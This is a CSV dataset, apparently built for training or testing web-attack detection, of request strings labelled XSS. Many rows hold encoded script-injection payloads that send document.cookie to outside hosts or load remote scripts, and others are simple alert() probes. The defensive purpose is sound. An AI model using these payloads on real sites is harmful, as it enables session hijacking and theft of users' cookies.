id,class,vector
234,XSS,/otlawecrdti/fEn69oWNoBWven.css?taltElsdxnyos9=Taiiee%28deYw2&dr=%3Besock_stream&o0Tx=ngrcp%40wr%27saa6%26sei&Uv=298556&ttiatgmg7koee=Hneme&D0Kv21ni_=9904717225&eecoshtflrttlE=74690&bNet=aabnutvareu&spwnrxioTt3xo54=0KlqzkQ-&mereenf=3677&iZrrelhhqgSibc=%3Am&Itwda=%3Cinput+type++%3D%22+++image+++%22+++dynsrc+++%3D++++%22javascript%3A%5Bwindow.open%28%27http%3A%2F%2F45.38.88.254%2Fonroll.mspx%27%2Bdocument.cookie%29%3B%5D+++%22+++%3E&Z5KIivbscriptjJU4=7303&YCxbetweenwget=ya6nslrcy&r8eld=hBzig
244,XSS,/Reoo/tbBlttgJDjw-2_/atZbthLi-6f/0srernaRonn/mtetdblrsussefc/2E22lKXQwEo/FFIl.asp?tanyodrh2npcn=i&1h=i%3Ein+1h&avddLne=%3Cimg+++++src%3D%26%7B%5Balert++++%28%27rpata%27%29%3B%5D%7D%3B%3E&oN9glebihgxa4yr=388971
246,XSS,/olex.gif?asextncd9hntks=vIY%3D7m%3C3eassobsmvSoh&4j=m&dryT=sseiwzoet1h
257,XSS,/7ftpaCRKGc2i5b/aMtsvsd9a1oBj2-wS/CJIKwGpFB3D0/hhb0WEG.nsf?bno5gslJqurlr=tndeeEtnbWy+i&afrebe4UdSkhi=+ggeyeDtc%26l%3Eba%27&iemnI=Eio+style%3Dleft%3Aexpression%28alert++++%28rsR.3lgOoy%29%29&sm3H=074298&zEEp=CsxeCoieeixrui&uerihm6tia=4081756231&y1i=Olktea&adle=51&TmAbee9s2eAtlt=rdd
281,XSS,/tJlGijdLqh-X./lx1sea/abArtLsaeh/hyw7S2D.exe?nuks7YshutdownXlnHL=otnwbe1tdew&sbiri=4338&tja2ietn=tn&iseooniimrn=javascript%3Aalert++%28+++++%22+++ot9z.o%22%29&memmoy4r=d3QiC3VO&nMEaToi=e+xterm+Ok+7wp-u&fEyNwawemoev8re=7nvprocessing-instruction6pjzdpassthruew%40+&mr0Msi9ua=enrpniopasnl&oiirrhi=mr%25r&tseeehpmfhospc=andszA
294,XSS,"/""><img"
295,XSS,/lio9ytr/oqVe5itaLdkZKxz@g/goFNBYcLGJm1cqwjF/_-wJZFChtpassjM/jxlWQ0oA4b8ANe0QBmh/lfttnrersrrd/sWc.tIShEezeokU3Ob/Entsvejanfqtdnywz/tXIc4jdhhavingTi/ziO7D3oatt.sh?hoknOang=%3Cdiv++++onmouseover++%3D++%22+%5Balert++%28%276ua8cy%27%29%3B%5D%22++++%3E&ntn1EMtfrrOey=564
298,XSS,/scsuhaieigth6mtE7A/aQdiQcwuQ/dKpasswdP9BAp55r/chtxe52is/bie9dtnn/hUeEdHwcaH-3mQRh/Nkn-42fEX6OmALX.swf?r7ermmehseddlty=%3Cdiv+++style++%3D++%22+behaviour%3A++++url%28%5Bhttp%3A%2F%2Fwww.mera.com%2Fscript%2Fjihn.pl%5D%29%3B+%22%3E&aa2qeTn=tdnfeolemootekkt&selvrVsesre=rrcp%7CtiommI0o2liborhinput&inacee9he=2473200&yhloqWnmcsi=dSkDT
303,XSS,/8ddpvhtta/s5a_7T9tgYbmr/fScZm2tx7/1tUKh/mbn/rCN0.Ec-0u4.@nM_D/nF9GHI.swf?aiomdSnruIfhbbn=e%3Di&watalnRnreOi=tlogMutmoresplikedb&0JVQ0fF=+6+ag&aease=1608&8ncri4eei=aogperlhbfetalwhere%5Dbi&nareOq7re=%3Cmeta++++http-equiv++++%3D+++%22++refresh++%22+++++content%3D+%22+0%3Burl%3Djavascript%3A%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.taer.com%2Fcgi-bin%2Fnt.cgi%27%2Bdocument.cookie%29%3B%5D+%22%3E&ejhtbnalenaahre=u+hfah&seeiuYse6io=310148
334,XSS,rorhcn0rioils=32978&tt=dbleve5hls&.U3E0atmpservicesOw=394409742&xefdmoodtatexp=4&ain=aL&ts1dIaGp=erco&rOFtHueznxrb=&<script >[window.open('http://20.95.247.41/veonng.php4'+document.cookie);]</script  >&aeENa52ixh=~sobjecttnEtuaupdatedMs1pnit&ep=4263850&elrjbi0ntIess=e&ide3=221
340,XSS,/EuNhV-@0m/Pinclude04m/o4eibhou1/eZZFZn/trYO1ArFXYD/shiNao/hSVBKLiTX9C7P/md.msf?talaua8tt8=ieuTlWF%3Eopen&2YZboot.iniYpositionyP-1S8=%3Cobject+++classid+%3D+%22+++++clsid%3A...+++++%22++++codebase+%3D+++%22javascript%3A+%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.la.com%2Fcgi-bin%2Ftotoetmall.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22%3E
342,XSS,/aYqY-Qhpi.k8uVH/nfsafr/dexOM6uf/hdxnEwgr/w5dNTbetweenM_cXtcVc/dN.4iEcWGRGuUgVJu/3UkoFpps.png?3nselaN4tTtyher=%3Clink+++rel+%3D++++%22+++stylesheet++%22++href++++%3D+%22++javascript%3A%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.isveanra.com%2Fcgi-bin%2Fis.cgi%27%2Bdocument.cookie%29%3B%5D++%22+%3E&igbnciunound=siall&tel=zrhten4c
354,XSS,/s.ukmVWngZOu/tV4yYK-iz7o4.mspx?d5=%26%7B%5Balert++++%28%27sUzsah%27%29%3B%5D%7D%3B&pKGahttpZ=1
383,XSS,/otaFGSmetainputCM/5rshutdown1adminKORAzFHO3/logltv_whereC.F_21Q/nEL.sDw654_I.png?pfstdindbqIJ=xeo3p&eeddoelt=hgieo%7Cattu&YftpDgnull=%3C%21--+--+--%3E%3Cscript%3E%5Bwindow.open%28%27http%3A%2F%2F203.152.46.252%2Fas.bin%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+++%3E%3C%21--+--+--%3E
389,XSS,/aaeatn/e@wvSZxiJ0/s@ar/zbe8teAme3ewit/lj25tne/VJ0ac/lisnmyhYtoeiwNrtte/zrP_hTxWjYuf/aecwobeylaoFvsiohfcg/uqQbSMvMY/i02r3rAjY19tK8.html?Ao4=%26%3Cscript%3E%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.onit.com%2Fcgi-bin%2Filelneic.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+++%3E
399,XSS,/hQKZ/3RYq/nWWu-Rw8Vs/l23o1L8g/zcNeeeIE9y3g.shtml?mh0aavc=rmJdioassNzhoeher&yA=iratdopezr&nEFu2e8ezl=orl&de9fdea=mg&Tvh=tqn4unsi%3F
400,XSS,/7tzlsesaARb9nyoneo.exe?idHnsh=kenn205oranDrcm&cnEnlluuhide=3&atiSw1dttoy0qe=%3Cbody+onload+%3D%22+%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.rileic.com%2Fcgi-bin%2Ftiermara.cgi%27%2Bdocument.cookie%29%3B%5D++++%22+%3E&rstedba=iK3sYQBMA&Tsayadeeeowern=cWZnADYWm&ierl=f+e9&te=smoruNljCdeauenl
404,XSS,/pt/oMKr/M5uorwsvczees7stRi/u.gdrN1oBORX5i/sZSB01/6DgyBKLM/k0t79wvihhBltreie/r2TzdL6siinhrsdou/ahen/BicPXZJaYprT/sChiaskFr/7Q1JB5l.html?fb=3&sstainUdeii2w=%5B%5CxC0%5D%5B%5CxBC%5Dscript++%3E%5Bwindow.open%28%27http%3A%2F%2F166.140.86.240%2Fch.aspx%27%2Bdocument.cookie%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript++%3E&telta=048696&te4foiqXpe=24949
410,XSS,/irYt6uul/nuF22phcRzaSn_q./as/aPXmQHOl/hmf.timyPnBo/td4nefacant/GS1Jctelnet/7hait9fe5frh5hL034/miy1ite6aunseln/hZ6.tiff?te7r7n=candie&nafEcfaSn=5NjIzK_8ef&rq1taale=4319&1noiID=%3Cimg+++src++++%3D%22+teolol++%3E++%22++++onmouseover++%3D+%22+++%5Balert+++%28%27ert9h%27%29%3B%5D+%22++++%3E&ieeadNiepdspzt=6&nwn=27&.3window.openwincludeS=%28+olsoperle+%7E
422,XSS,/saldouhENrheo/toa6ehritnsIe/1wzratldSDhtlhaet/r1LkQsR0lhvc@/kQD3FRPqmI/htdstbkode/eznmls3w/k9hS8tAvarmail0.css?f6m=051&nxsc=sn%27iwRE+ix%2F3iat&jtt=a8nLAupznls9e&ytwpeuhpoOeyN=9481
434,XSS,/2GLSsYUb2o.De9/rAR/cloKbLC/ssaxbairo3as1/hH6.css?edt=lSutna&nxIOoenu4rna=%3Cimg++src+++%3D+%22++++javascript%3A+%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.st.com%2Fcgi-bin%2Fge.cgi%27%2Bdocument.cookie%29%3B%5D+%22++%3E&rsElTi1ipn3u=isth
459,XSS,/e28jydscEeo/eprpOFshroTitce3Tsa/i04xAiwrh3ntntre/eImuR9tft/r2NubS0libU/sxTac8Y8DyARx0WPb/tBEfZSm/fecne5thaO5ni3e.js?rielaisgw=6&Mbgsoundexec.4=uesfhometerzselectd3edeleteua4&aetutim4faE0t=meiet%2F%3Bdelu%28mie9o%5Be+&boorL7FRP=2432&hetottgsniecl2l=%3Ca+href%3D++%22++++about%3A%3Cs%26%2399%3Bript+%3E%5Balert+%28%279eealEa%27%29%3B%5D%3C%2Fscript++++%3E+++%22%3E&ges=99999290
461,XSS,/qyi/yaoEgiaiddxoemiwbq/sRpeyA3hjwsQuBSZ/iZpIb0hG209crb71/n-IIFRfcvmx0HKgx/l17itPjeX7BfTOmZa.mspx?P@@Uk0GMNDmz=4382773056&doznhforeoR=%3Cimg++++src+%3D++%22ic++++%3E++%22++onmouseover+++%3D%22++%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.ngal.com%2Fcgi-bin%2Fil.cgi%27%2Bdocument.cookie%29%3B%5D+++%22+%3E
463,XSS,/enVI.z/rn/Ssc1gZhtaccesaOselectWbAF/sserakviabsuAlqtt/Yntwrlhicneycme2gS/mngtreot3E2.swf?ts6ntfbodgN=t%24&rQLGzWuT=+document&n7epiiasioe4=30615725&so7sndi1=%3Cinput++type++%3D%22image%22+++dynsrc%3D+%22javascript%3A++++%5Balert%28%27ddmia%27%29%3B%5D++%22%3E&andhh8q7ot6frdi=218140&ttyqe2migdvn=1556&n4rjsitfsld=32063
464,XSS,/q7cTfKW_US/eSZ3UZ2g89PznBGIm/tae9r7nolw/jJzlC2XWTASTtkEfN./eP4BCdeYyfnH71F/bw@hgo-REH30I/sp6UdAPIZRrblfNJ16/rScqwXSY/cann/sEl.cfm?hr=%3Ca++++href%3D%22++javas%26%2399%3Bript%26%2335%3B%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.etetle.com%2Fcgi-bin%2Ftant.cgi%27%2Bdocument.cookie%29%3B%5D%22+%3E&uHtsoui=ha&higrznpdbqinUe=eSe%408+%27Th+exec&libe=teBhoE&9l=r1%5Ddyt3e7%2BagG8openU&jynO=tnevtsor
468,XSS,dmee=9063095&lj5Rnltlp4b='eh y&Aeorsl3mlboel=39&lu4rosio7ader=sq&TIKLbv0dKH=eono$eOg>3x&qiyEd=orn0m&cjTR=;rmfResnt&tim=59160520&HNUI=7185118005&SFxanogvbveTru=?c) 9&@RalQ_PQO4=ln&4oqNHi=nytt%8riybinypqiioscriptlyr&isEseEegYtdEm2i=lcy\nph-aIRe
481,XSS,/8InI6E.DeV74i5yN/szex6nKpwFVsNGZp/eM/kQ@6Gk3lZVCyHr5A/2eTeois3uNicmr/usn10in1ronnbwtaa/igw.php?LGdi2=h0Qap&Jawp-Xze7p=izsobjectt4+httscie1%3Fert&8x4O8mochacopykDJ4=%3Cstyle++type++%3D++++%22+++++text%2Fjavascript+%22++++%3E%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.aressiol.com%2Fcgi-bin%2Fransve.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fstyle%3E&iettaqo2hot=osede2EtNo7ei9ao20&Pampafum2ttgso=dIb22SOyIF&9opensMQb=22428&eryosi6shobn=e2dropot&3hOn2jT2E2=0axAfahet&hAttkreO=ies8doo&QP2-Shtpass9DXhomeX=abgsound
511,XSS,"crtihjkEdAiufs= h er&sfsIiaT1K=nnas&esSi=i2CIin2&tc=tty5cte&pgn7El1=tg_&1minos=e:is xtermeAeeftot&jvzeesv=l.QM@k&alolontseotea=eg0zOmdSr&Euyr4eaiEd=1&shpl6crSenpcoh=oa&mnsyndth=onni&9tmiiaasllDm2Th=s&iecn4alxeuecr=afohxmlkacunsz6&psfhrk3=<div style  =   ""     behaviour"
525,XSS,/nLjapNEuWrZAV-J.ISi/5.m/tBognnssa7nout/eP2Qub4dBH-NAkj@Nf16/vtcetho3tn6vans9M/uitueahHsb/8ODMwhereYdocument-c78MdjZ.gif?otocwbea=2fnformo&nhdu=%3Cimg+dynsrc+%3D+++%22++javascript%3A%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.li.com%2Fcgi-bin%2Fnden.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22+++%3E
527,XSS,/aes.qD.X4W-9qZOjSX3/ossneifrkde/neidsrq0rj/ljq9_YnTQtJkxQ_FlhPh/tp7Nv/reRLy/tni7Rrwct6dceotEdo/6fromzmD8etc/ha3/siMT9aEnesl/5PzE.css?dhaut=%3Cdiv+++style++%3D+++%22++++binding%3A+++url%28%5Bhttp%3A%2F%2Fwww.de.com%2Fscript%2Ftdaosar.sh%5D%29%3B+%22++%3E&e8a=56502
589,XSS,/tnW3eoe/one8ua/3eR5RRD.asp?gZiframe_6l-httpsGD=arR&emzipsE=%3Cdiv+++style+%3D+++%22++++binding%3A++url%28%5Bhttp%3A%2F%2Fwww.tr.com%2Fscript%2F9lnL4.cgi%5D%29%3B++%22++++%3E&eerlhjh=ilh0&rhifsQt=rf+Ah&gsoajheeaeatt=97&nn3ote3ctu=or%2FDbgsound&eahsi9ddesxm=yrttkiew6a&kdnlaEEieiOxa=tsb%3Dt4sMhLIhoitehttpss&tea87e=7454114
594,XSS,"njgdahtc1nr=8NzLIHU@jl&Dtv_Q=SeoqanyhSs&Itmp_eeQ=yu&eeysbsq=<div style  =""  background-image"
601,XSS,/<script>alert('Vulnerable')</script>.shtml?
607,XSS,/<SCRIPT>alert(document>URL)</SCRIPT>/?
621,XSS,/agtecemaw0iojh52/9aY3vwOj/9QCI/ivLBZjTUK/mJlZAfgA3oCdgFq/ece1ifudfnsi10/as6ee/llsANJ_rls0aV/dpiren41etNlp/Ctlr.pl?
648,XSS,/aetSsletsaeio4a3/1X/oNQ1.cgi?d92denpari9iaeu=410&tyhpiref=gd1egttfle6ndeen&at3Tb2Leor=%3Cdiv+style++%3D++%22++++background-image%3A+url%28javascript%3A%5Bwindow.open%28%27http%3A%2F%2F175.61.196.229%2Fie.php4%27%2Bdocument.cookie%29%3B%5D%29%3B+++++%22+++%3E&at3da=r+dfs0bodymsuboot.inins&4NoW.=eIc-db3Uz&c9fzjF=Hgt1&rftsyuU=1ehw&1oLditqnted6zm=input&e5=nDsbuydf2qtugcbpe&tesrltbo=eh&.fx@0NTec=se&0b=%7C+&nsett=r
660,XSS,nokos=69&UBo0q83nbS=590&passthru0azPnullI1mRydZ=tzXsB.ys2ur&7lx5fTsPo= smrscateaItnt/8d&ahiwas5eogwetYq=|&jetANt=hBtsaptaai9o&Sna6ti=m?htalth-?uHpasswdu&a20Q=9188808&aAcawlbsnca=keEimvoei&BstftA4rjsnr=tIaNVBVb
664,XSS,/Ae3aucei/eI74rdS6x3lBCa/e@N8tiO_.NogJQW8fTt.cgi?aedljtosits=necho&AdT=%7Csneo%7ErwOhz3%3D6m&eWh=57&etEsoiahdmbe=t55r&d6osdaeeeaAo=%3Cimg+src++%3D++++%22++livescript%3A%5Bwindow.open%28%27http%3A%2F%2F115.64.163.145%2Fchlaie.swf%27%2Bdocument.cookie%29%3B%5D++++++++++%22%3E&xmlU6sSFKWL=38213&Pstwes2nit1itbd=dOtn%2Bij7Icc&TJFcC5Np3DTR=4&c0n1Imep=7280084001&T9dswas=724249&nhhunNeN=3Xq&9cnhzen=ltnyeuac4fn&Rgte=h1ANHTw8EC4r&cerizTiqu1dc=euSncjdnnmbwett
669,XSS,"/""><img"
679,XSS,utbmeruroife9et=ua3y&nso42Jasibon=ohugsjFh&LQiwL=teprocessing-instruction&wseas=e_m&piol2eaua=wmtH?eee sha&taty=1&lfnoLatuni0i=2ec htt&HIUy_YobPK=iNrw ihaving&qj0nb=aNXouf8c&uiohdheifdo=i9D&nShnod9fDieoian=s4rag\isrr(t&_bYYPstylelike@97=?eOu67yTe|&apez6jd=ayenxej7n&-in4Nu0KON=script  alert (0llerhai7ls.hm9aw)script   &aemsiy=dad7ae9eaosEedlh
680,XSS,"feagiimr4ghohai=<div   onmouseover = ""[alert ('chidpinlr');]    "">&vthtN=odqenieb&tl=dLubbhe&EuI&nyee5f7riaS46p=541637&em6c3itfeudnuh=iframe&nceau4r6XsJotte=5632835318&iZedhop=0elaer25tkiy"
698,XSS,/<SCRIPT>alert(document>URL)</SCRIPT>/?
704,XSS,Mraasewdeuwi=ncae&hE1isnTtA=18081266&ctcn7zaEib6r=did&pn7dm4tdenohtbr=ran$eihdbnF &tivde=tRcex&6uit=172082958&s2dcplrpe5yhodl=%gh<&Te1ei0=hs1oOIqBddUD
709,XSS,/<SCRIPT>alert(document>URL)</SCRIPT>/?
713,XSS,/0Ratdm/szpkEoURkUiy28/HDFrqI3duefh0M/etdnrdiOtrhenot7hNr5/eYEKXmcuX7@Pg.aspx?lo7tp=Abu&hub2tmrsMud=0940&wciwX=%241e&rnaewSckeeedcH=yr4lTa1vu6rhh5o6td&l.access_logQZnD5=script+alert%28ttrhifmmn.tedr%29script+&H0tononhldo=Tecitrdl%3Ctos&oQio6Iotn=noQdhqpeKYl
714,XSS,/rD-LDI3c3zXSAeOoD/vSVW5updateDlIV2YWZC/dttre/9wyPdU9bHp52JLVieT9Q.gif?untolilnehixsi=otx&lyecouhg=2+d&N_vN=07&2t=%3Cdiv+++style++%3D++++%22+++++binding%3A++++url%28%5Bhttp%3A%2F%2Fwww.rielnean.com%2Fscript%2Feso.nsf%5D%29%3B%22++++%3E
717,XSS,/owp-@CfE/rznZO8DtJ9QXE6v1.jpg?X_krKok=4243072&oo@7qNgU=lOitt+SGi&lptecRnasn8=eeky%5Dhay1+atf&twptqei=564&8wVDsuCdWh=c68nr&Zrctsccri4krn=ie&sLSFybT=84128&aeo=Sipo4rh&iliw=454&en=fEltsrtatit&astm=tn&lta0mp=etinsertwp-vU+homeofuS%3A&ilie4t=iframeutaef
